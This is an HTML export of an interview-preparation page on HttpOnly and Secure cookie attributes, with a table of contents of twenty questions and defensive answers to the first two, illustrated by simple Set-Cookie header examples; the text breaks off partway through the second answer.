<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>HttpOnly and Secure Cookies Interview Questions  &amp; Answers</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

/* Override strong tags inside headings to maintain consistent weight */
h1 strong,
h2 strong,
h3 strong {
	font-weight: 600;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 10px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.collection-content td {
	white-space: pre-wrap;
	word-break: break-word;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
	margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-flex;
	align-items: center;
	justify-content: center;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.callout img.notion-static-icon {
	width: 1em;
	height: 1em;
}

.callout p {
	margin: 0;
}

.callout h1,
.callout h2,
.callout h3 {
	margin: 0 0 0.6rem;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

blockquote.quote-large {
	font-size: 1.25em;
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(44, 44, 43, 1);
}
.highlight-gray {
	color: rgba(125, 122, 117, 1);
	fill: rgba(125, 122, 117, 1);
}
.highlight-brown {
	color: rgba(159, 118, 90, 1);
	fill: rgba(159, 118, 90, 1);
}
.highlight-orange {
	color: rgba(210, 123, 45, 1);
	fill: rgba(210, 123, 45, 1);
}
.highlight-yellow {
	color: rgba(203, 148, 52, 1);
	fill: rgba(203, 148, 52, 1);
}
.highlight-teal {
	color: rgba(80, 148, 110, 1);
	fill: rgba(80, 148, 110, 1);
}
.highlight-blue {
	color: rgba(56, 125, 201, 1);
	fill: rgba(56, 125, 201, 1);
}
.highlight-purple {
	color: rgba(154, 107, 180, 1);
	fill: rgba(154, 107, 180, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(207, 81, 72, 1);
	fill: rgba(207, 81, 72, 1);
}
.highlight-default_background {
	color: rgba(44, 44, 43, 1);
}
.highlight-gray_background {
	background: rgba(42, 28, 0, 0.07);
}
.highlight-brown_background {
	background: rgba(139, 46, 0, 0.086);
}
.highlight-orange_background {
	background: rgba(224, 101, 1, 0.129);
}
.highlight-yellow_background {
	background: rgba(211, 168, 0, 0.137);
}
.highlight-teal_background {
	background: rgba(0, 100, 45, 0.09);
}
.highlight-blue_background {
	background: rgba(0, 124, 215, 0.094);
}
.highlight-purple_background {
	background: rgba(102, 0, 178, 0.078);
}
.highlight-pink_background {
	background: rgba(197, 0, 93, 0.086);
}
.highlight-red_background {
	background: rgba(223, 22, 0, 0.094);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(125, 122, 117, 1);
	fill: rgba(125, 122, 117, 1);
}
.block-color-brown {
	color: rgba(159, 118, 90, 1);
	fill: rgba(159, 118, 90, 1);
}
.block-color-orange {
	color: rgba(210, 123, 45, 1);
	fill: rgba(210, 123, 45, 1);
}
.block-color-yellow {
	color: rgba(203, 148, 52, 1);
	fill: rgba(203, 148, 52, 1);
}
.block-color-teal {
	color: rgba(80, 148, 110, 1);
	fill: rgba(80, 148, 110, 1);
}
.block-color-blue {
	color: rgba(56, 125, 201, 1);
	fill: rgba(56, 125, 201, 1);
}
.block-color-purple {
	color: rgba(154, 107, 180, 1);
	fill: rgba(154, 107, 180, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(207, 81, 72, 1);
	fill: rgba(207, 81, 72, 1);
}
.block-color-default_background {
	color: inherit;
	fill: inherit;
}
.block-color-gray_background {
	background: rgba(240, 239, 237, 1);
}
.block-color-brown_background {
	background: rgba(245, 237, 233, 1);
}
.block-color-orange_background {
	background: rgba(251, 235, 222, 1);
}
.block-color-yellow_background {
	background: rgba(249, 243, 220, 1);
}
.block-color-teal_background {
	background: rgba(232, 241, 236, 1);
}
.block-color-blue_background {
	background: rgba(229, 242, 252, 1);
}
.block-color-purple_background {
	background: rgba(243, 235, 249, 1);
}
.block-color-pink_background {
	background: rgba(250, 233, 241, 1);
}
.block-color-red_background {
	background: rgba(252, 233, 231, 1);
}
.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="2b2562ad-76f0-8045-91ce-e3d02e2f4720" class="page mono"><header><h1 class="page-title" dir="auto">HttpOnly and Secure Cookies Interview Questions  &amp; Answers</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="ltr"><nav id="2b2562ad-76f0-80b4-a616-e5c99a2ab359" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b2562ad-76f0-8080-990b-c4f1dbaf9b5c"><strong>Fundamental Questions</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80f4-b2f4-ca330917b9c6"><strong>Q1: What is the HttpOnly attribute and what does it protect against?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-804d-8f22-def2447265b0"><strong>Q2: What is the Secure attribute and why is it important?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8073-9586-fae740490a83"><strong>Q3: Does HttpOnly protect against CSRF attacks?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8067-a25a-e032954c35ce"><strong>Q4: What is the SameSite attribute and how does it protect against CSRF?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80cb-abce-cbf84566613c"><strong>Q5: What are cookie prefixes (__Secure- and __Host-)?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b2562ad-76f0-80b6-82e2-d9343b83d44e"><strong>Scenario-Based Questions</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80a0-a735-dcc1f5705b49"><strong>Q6: How would you configure cookies to prevent both XSS and CSRF attacks?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80c6-af5e-f84e8a7f236d"><strong>Q7: A user reports that they get logged out when clicking links from email. What could be the cause?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-801a-9a95-daad66fe9962"><strong>Q8: Your application needs to work with third-party widgets. How do you configure cookies?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80c6-a359-dadd4daea043"><strong>Q9: You discover that your session cookies are being sent over HTTP. What&#x27;s wrong?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8017-ac88-ee759231e1f2"><strong>Q10: An attacker successfully performs a CSRF attack even though your cookies have HttpOnly. Why?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-804d-b0b6-e4e0c5633aa6"><strong>Q11: Your multi-tenant SaaS application has cookies accessible across subdomains. How do you fix this?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8035-a939-d6314407a1da"><strong>Q12: Your CSRF tokens are being stolen via XSS. How do you protect them?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b2562ad-76f0-80e2-b131-fc1e7878474d"><strong>Implementation Questions</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-800a-aaf1-e313c505593a"><strong>Q13: How do you set secure cookies in Node.js/Express?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8064-bbf7-c162fbf1344c"><strong>Q14: How do you set secure cookies in Python/Flask?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8039-8717-c99360cec5d4"><strong>Q15: How do you verify that cookies are set correctly?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b2562ad-76f0-8047-bc80-d6603008f5b7"><strong>Troubleshooting Questions</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8037-8144-e885b586db38"><strong>Q16: Cookies are not being set. What could be wrong?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-808b-bfa6-f10c94c9081b"><strong>Q17: Users are getting logged out unexpectedly. What could cause this?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b2562ad-76f0-8010-8d90-e24bd12ae202"><strong>Advanced Questions</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8047-811c-d7cfa87be3a6"><strong>Q18: Explain the difference between HttpOnly, Secure, and SameSite attributes.</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8048-9c42-e0fc8f46856c"><strong>Q19: How do you implement &quot;Remember Me&quot; functionality securely?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8082-84a1-e557ab0fd2b1"><strong>Q20: How do cookie security attributes work together in a defense-in-depth strategy?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b2562ad-76f0-80bf-a6ad-fdd53919daaf"><strong>Quick Reference Answers</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8010-b996-d3dca12da327"><strong>What protects against XSS?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8071-8ba2-f8ab21729426"><strong>What protects against CSRF?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80d7-b790-c90c06248b33"><strong>What protects against MitM attacks?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80d2-98b8-d3dc10ad9d59"><strong>What is the recommended cookie configuration?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8007-a470-e944d925ce6b"><strong>Does HttpOnly protect against CSRF?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b2562ad-76f0-802f-a0a5-fee93fa154b0"><strong>Summary</strong></a></div></nav></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-8038-a2af-df5b1db7c62d"/></div><div style="display:contents" dir="auto"><h2 id="2b2562ad-76f0-8080-990b-c4f1dbaf9b5c" class=""><strong>Fundamental Questions</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80f4-b2f4-ca330917b9c6" class=""><strong>Q1: What is the HttpOnly attribute and what does it protect against?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8089-aca8-e6342f90a4eb" class=""><strong>Answer:</strong> The <code>HttpOnly</code> attribute is a cookie security flag that prevents client-side JavaScript from accessing the cookie through <code>document.cookie</code> or other DOM APIs.</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80d8-83f2-e534f53eb77d" class=""><strong>What it protects against:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8098-be7a-e084a1bdb0d6" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>XSS (Cross-Site Scripting) attacks</strong> - Prevents malicious scripts from stealing cookies</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8017-bd7a-e900d3b1105a" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Cookie theft via JavaScript</strong> - Blocks access to sensitive cookie data</li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80c1-8c1b-f024a2f23a90" class=""><strong>What it does NOT protect against:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80e5-91bd-f72aa6fa7f02" class="bulleted-list"><li style="list-style-type:disc">❌ <strong>CSRF (Cross-Site Request Forgery) attacks</strong> - Browser still automatically sends cookies with requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-800d-b47f-f652d85e84e4" class="bulleted-list"><li style="list-style-type:disc">❌ <strong>Man-in-the-Middle attacks</strong> - Does not encrypt or secure transmission</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80bc-a777-ef14a1acfa2b" class="bulleted-list"><li style="list-style-type:disc">❌ <strong>Server-side vulnerabilities</strong> - Only affects client-side access</li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-803b-af03-dec84f30f556" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8031-a33f-f66ffbd3d82c" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Without HttpOnly (vulnerable)Set-Cookie: sessionId=abc123
// JavaScript can access: document.cookie includes sessionId// With HttpOnly (protected)Set-Cookie: sessionId=abc123; HttpOnly
// JavaScript cannot access: document.cookie does NOT include sessionId</code></pre></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-80f9-a836-f29d641a07c3"/></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-804d-8f22-def2447265b0" class=""><strong>Q2: What is the Secure attribute and why is it important?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8006-a0d2-f920a2d24130" class=""><strong>Answer:</strong> The <code>Secure</code> attribute ensures cookies are only transmitted over HTTPS connections. Browsers will refuse to send <code>Secure</code> cookies over unencrypted HTTP connections.</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-804b-88b7-e2b7bc0540a6" class=""><strong>Why it&#x27;s important:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8004-a9f1-fae93ef65c55" class="bulleted-list"><li style="list-style-type:disc">Prevents cookie interception over insecure networks</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8059-a7d6-e9cd4476eef4" class="bulleted-list"><li style="list-style-type:disc">Protects against Man-in-the-Middle (MitM) attacks</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8080-979b-c246cc953fe8" class="bulleted-list"><li style="list-style-type:disc">Required for <code>SameSite=None</code> cookies in modern browsers</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-808d-8330-fb42178fa918" class="bulleted-list"><li style="list-style-type:disc">Essential for protecting sensitive data in transit</li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-806a-9863-cca4f07910df" class=""><strong>Important notes:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8085-bb5a-f321bb53ca12" class="bulleted-list"><li style="list-style-type:disc"><code>Secure</code> does NOT encrypt the cookie value itself</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80a2-a111-d9e255883da6" class="bulleted-list"><li style="list-style-type:disc">Relies on HTTPS/TLS for encryption</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8021-8f9e-fade9c3a5a26" class="bulleted-list"><li style="list-style-type:disc">Cookies without <code>Secure</code> can be intercepted over HTTP</li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80f4-880d-c825742df0a3" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8072-8944-dfff363d8cf9" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Without Secure (vulnerable)Set-Cookie: sessionId=abc123
// Sent over HTTP in plaintext - can be intercepted// With Secure (protected)Set-Cookie: sessionId=abc123; Secure
